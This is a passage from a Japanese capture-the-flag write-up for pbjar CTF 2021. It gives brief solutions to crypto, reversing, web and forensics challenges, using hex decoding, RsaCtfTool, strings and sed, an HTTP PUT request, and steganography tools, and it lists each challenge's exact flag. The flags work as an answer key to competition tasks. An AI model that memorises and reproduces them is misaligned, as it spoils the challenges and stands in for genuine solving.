Input dataをutf-8にしたら出てきます。

<br />

Flag: `flag{web3js_plus_ABI_equalls_flag}`



<br /><br />
<br /><br />
## [Crypto]: Convert
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_crypto1.png" alt="pbjar_CTF_2021_crypto1.png">

<br />
### Solution
666c61677b6469735f69735f615f666c346767675f68317d を文字にするだけです。

<br />

Flag: `flag{dis_is_a_fl4ggg_h1}`



<br /><br />
<br /><br />
## [Crypto]: ReallynotSecureAlgorithm
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_crypto2.png" alt="pbjar_CTF_2021_crypto2.png">

<br />
### Solution
RsaCtfTool.py で解けます。

<br />

Flag: `flag{n0t_to0_h4rd_rIt3_19290453}`



<br /><br />
<br /><br />
## [Rev]: polymer
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_rev1.png" alt="pbjar_CTF_2021_rev1.png">

<br />
### Solution
strings を実行すると、Fake フラグが大量に表示されます。

かと言って、grep -v で除外してしまうと行単位で消えちゃうので正解のフラグも除外されてしまう、というチャレンジです。

sedを使って除外しました。

<pre>
$ strings polymer | grep -v "flag{n0t_th3_fl4g_l0l}"
$ 
$ strings polymer | sed -e 's/flag{n0t_th3_fl4g_l0l}//g' | grep flag
mr.   i'll ask you what the real flag is flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921} think we'd all like to know.
</pre>

<br />

Flag: `flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921}`



<br /><br />
<br /><br />
## [Web]: cOrL
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_web1.png" alt="pbjar_CTF_2021_web1.png">

<br />
### Solution
admin / admin でログインしようとすると、以下のメッセージが表示されます。

<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_web1a.png" alt="pbjar_CTF_2021_web1a.png">

よくよく見ると、`put`の部分がBoldになっています。

HTTP メソッド PUT を使うとフラグが得られます。

<br />

Flag: `flag{HTTP_r3qu35t_m3th0d5_ftw}`


<br /><br />
<br /><br />
## [Web]: Hack NASA With HTML Mr. Inspector Sherlock
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_web2.png" alt="pbjar_CTF_2021_web2.png">

<br />
### Solution
とりあえず、`wget -r` でまとめてダウンロードしてきて、ローカルで grep したり ブラウザで開いたりしてフラグを見つけました。

3つに分かれています。

<br />

animate.js:
<pre>
dynamicanimAttr = "dynamicanimation flag{wA1t_a_m1nUt3_"
</pre>

<br />

what.html:
<pre>
What Is This? Flag part 2: I_th0ugh1_sh3l0ck_w2s
</pre>

<br />
index.html:
<pre>
Flag part 3: _a_d3t3ct1iv3????!?!?!}
</pre>


<br />

Flag: `flag{wA1t_a_m1nUt3_I_th0ugh1_sh3l0ck_w2s_a_d3t3ct1iv3????!?!?!}`




<br /><br />
<br /><br />
## [Forensics]: Stegosaurus stenops
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_forensic1.png" alt="pbjar_CTF_2021_forensic1.png">

<br />
### Solution
[StegSeek](https://github.com/RickdeJager/StegSeek) でフラグが得られます。

<br />

Flag: `flag{ungulatus_better_than_stenops}`



<br /><br />
<br /><br />
## [Forensics]: Wirf die Gläser an die Wand
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_forensic2.png" alt="pbjar_CTF_2021_forensic2.png">

<br />
### Solution
一時期、日本でも大ブームとなった[モスカウ](https://www.youtube.com/watch?v=Fmyy1Km-cTE)の歌詞ですね。懐かしい！

<pre>
Fremd und geheimnisvoll	   	 	      	       	      	     	     
Türme aus rotem Gold	      	  	     	  	  	     	  
Kalt wie das Eis    	   	   	   	     	  	 
Moskau	      	 	     	       	      	      	   	       	    
Doch wer dich wirklich kennt  	     	       	   	      	 
Der weiß, ein Feuer brennt	   	  	  	  		
In dir so heiß	     	   	     		     			       
Kosaken hey hey hey hebt die Gläser (hey, hey)    	   		
Natascha ha ha ha du bist schön (ha ha)	      	  	    	       
Towarisch hey hey hey auf das Leben (hey, hey)      		
Auf dein Wohl Bruder hey Bruder (hey, hey, hey, hey)
:
(snip)
</pre>

<br />
空白文字が各行の後ろにあるので、stegsnow です。キーワードは曲のタイトル「Moskau」で一発で当たりでした。

<pre>
$ stegsnow -C -p "Moskau" message.txt ; echo
flag{du_bist_ein_echter_Russe}
</pre>

<br />

Flag: `flag{du_bist_ein_echter_Russe}`










<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
